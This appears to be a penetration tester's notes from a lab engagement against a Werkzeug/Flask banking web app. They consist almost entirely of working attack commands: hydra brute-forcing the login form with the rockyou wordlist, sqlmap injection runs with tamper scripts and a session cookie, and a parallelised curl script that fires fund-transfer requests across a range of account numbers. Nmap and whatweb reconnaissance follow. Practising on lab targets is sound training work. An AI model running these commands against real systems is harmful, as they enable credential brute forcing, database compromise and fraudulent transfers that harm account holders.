
## Pentest

```sh
hydra -I -l 99 -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -s 5000 ${TARGET_IP} http-form-get "/:user=^USER^&pass=^PASS^:S=302"
hydra -I -l 100 -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -s 5000 ${TARGET_IP} http-form-get "/:user=^USER^&pass=^PASS^:S=302"
```

```sh
sqlmap http://10.10.178.141:5000 --tamper=space2comment --level 3 --risk 3 --data 'account_number=101+&password=hello'
```

```sh
sqlmap http://10.10.178.141:5000 --cookie="session=eyJuYW1lIjoiVGVzdGVyIiwidXNlciI6MTEwfQ.Z1tB3g.jyoCFwdXj7uP7v6TVesQ7O3-zng" --tamper=space2comment --level 3 --risk 3 --data 'account_number=101&ammount=1'
```

```sh
send_req() {
  id="$1"
  curl -L -s 'http://10.10.178.141:5000/transfer' \
    -X POST \
    -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0' \
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
    -H 'Accept-Language: en-US,en;q=0.5' \
    -H 'Accept-Encoding: gzip, deflate' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'Origin: http://10.10.178.141:5000' \
    -H 'Connection: keep-alive' \
    -H 'Referer: http://10.10.178.141:5000/dashboard' \
    -H 'Cookie: session=eyJuYW1lIjoiVGVzdGVyIiwidXNlciI6MTEwfQ.Z1tB3g.jyoCFwdXj7uP7v6TVesQ7O3-zng' \
    -H 'Upgrade-Insecure-Requests: 1' \
    -H 'Priority: u=0, i' \
    --data-raw "account_number=${id}&amount=1" | grep Success
}
export -f send_req

array=$(seq 99 112)

parallel send_req ::: "${array[@]}"
```

## nmap report

```sh
nmap -sV -sC ${TARGET_IP}
```

## Whatweb

```txt
http://10.10.178.141:5000/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.4 Python/3.8.10], IP[10.10.178.141], Python[3.8.10], Werkzeug[3.0.4]
```

### links

* [cvss calculator](https://www.first.org/cvss/calculator/3.1)
* [cyberchef](127.0.0.1:8081)


